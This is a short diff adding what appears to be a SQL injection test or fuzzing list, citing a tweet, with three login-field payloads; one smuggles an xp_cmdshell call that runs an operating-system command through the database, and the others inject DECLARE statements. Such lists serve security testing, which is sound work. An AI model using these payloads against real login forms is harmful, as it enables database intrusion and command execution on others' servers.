@@ -1,0 +1,5 @@
+# https://twitter.com/ru_raz0r/status/750311113435283456
+#
+username'exec master..xp_cmdshell'ping 127.0.0.1' -- and password = 'test'
+username'declare @s varchar (8000); ...
+username'DECLARE @find varchar(30) = 'Man%'
